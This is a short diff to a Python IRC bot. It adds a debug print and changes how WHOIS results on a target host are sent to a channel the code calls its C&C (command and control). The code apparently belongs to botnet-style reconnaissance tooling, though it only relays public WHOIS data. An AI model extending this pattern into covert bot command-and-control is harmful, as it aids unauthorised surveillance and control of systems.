@@ -160,6 +160,7 @@ def whois8(message):
 def whois9(message):
     """Handle IRC code 318, End of WHOIS."""
     global WHOIS_B
+    print("RECIEVED CODE 318")
     WHOIS_B = WHOIS_B + "\n" + str(message)
     ParseResult(WHOIS_B)
 
@@ -183,10 +184,10 @@ def ParseResult(result):
                 y = [x for (i, x) in enumerate(temps) if i not in (0, 1, 2, 3)]
                 UserS.Chan = str(y)
             if(temps[1] in '318'):
-                SendWhois(UserS)
+                SendWhois()
 
 
-def SendWhois(res):
+def SendWhois():
     """Send Whois results to C&C."""
     bot.say(CC_CHANNEL, "Results for WHOIS on: " + TRGT_HOST)
     msg = "NICK: "+UserS.Nick+". NAME: "+UserS.Name
